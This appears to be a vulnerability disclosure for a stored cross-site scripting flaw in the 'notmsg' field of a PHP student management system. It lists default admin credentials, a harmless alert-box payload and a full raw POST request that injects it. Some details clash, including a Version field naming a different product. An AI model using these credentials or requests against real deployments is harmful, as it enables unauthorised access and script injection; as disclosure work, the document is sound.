# Online student management system  - 'notmsg' Stored Cross-Site Scripting(XSS)


#### Exploit Title: Online student management system  - 'notmsg' Stored Cross-Site Scripting(XSS)
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html
#### Software Link:https://www.sourcecodester.com/download-code?nid=16137&title=Online+student+management+system+in+php+free+download
#### Version: Badminton Center Management System
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
Persistent XSS (or Stored XSS) attack is one of the three major categories of XSS attacks, the others being Non-Persistent (or Reflected) XSS and DOM-based XSS. In general, XSS attacks are based on the victim’s trust in a legitimate, but vulnerable, website or web application.Online student management system s' does not filter the content correctly at the "notmsg" module, resulting in the generation of stored XSS.

#### Payload used:

`<img src="" onerror="alert(111111111)">`

#### Proof of Concept

1. Login the CMS. 
   Admin Default Access:

   Username : mayurik
   Password : rootadmin

   

2. Open Page http://192.168.67.10/manage-students.php, Click the button to jump to the editing page.

   ![image-20231218171443708](img/Online student management system(XSS) 2/image-20231218171443708.png)

   http://192.168.67.10/edit-student-detail.php?editid=1

   ![image-20231218171500707](img/Online student management system(XSS) 2/image-20231218171500707.png)

   

   

3. Put XSS payload   in the "notmsg"  ;

   send package

   

   ```
   POST /edit-public-notice-detail.php?editid=1 HTTP/1.1
   Host: 192.168.67.10
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate
   Content-Type: multipart/form-data; boundary=---------------------------229580367932215906372765851428
   Content-Length: 467
   Origin: http://192.168.67.10
   Connection: close
   Referer: http://192.168.67.10/edit-public-notice-detail.php?editid=1
   Cookie: PHPSESSID=41k6lb8lgvu5aiq908id5u1qgh
   Upgrade-Insecure-Requests: 1
   
   -----------------------------229580367932215906372765851428
   Content-Disposition: form-data; name="nottitle"
   
   water supply unviability 
   -----------------------------229580367932215906372765851428
   Content-Disposition: form-data; name="notmsg"
   
   `<img src="" onerror="alert(111111111)">`
   -----------------------------229580367932215906372765851428
   Content-Disposition: form-data; name="submit"
   
   
   -----------------------------229580367932215906372765851428--
   
   
   ```
   
   
   
   


4. back to http://192.168.67.10/edit-public-notice-detail.php?editid=1 We can see the alert.;

   ![image-20231218171034851](img/Online student management system(XSS) 2/image-20231218171034851.png)

   

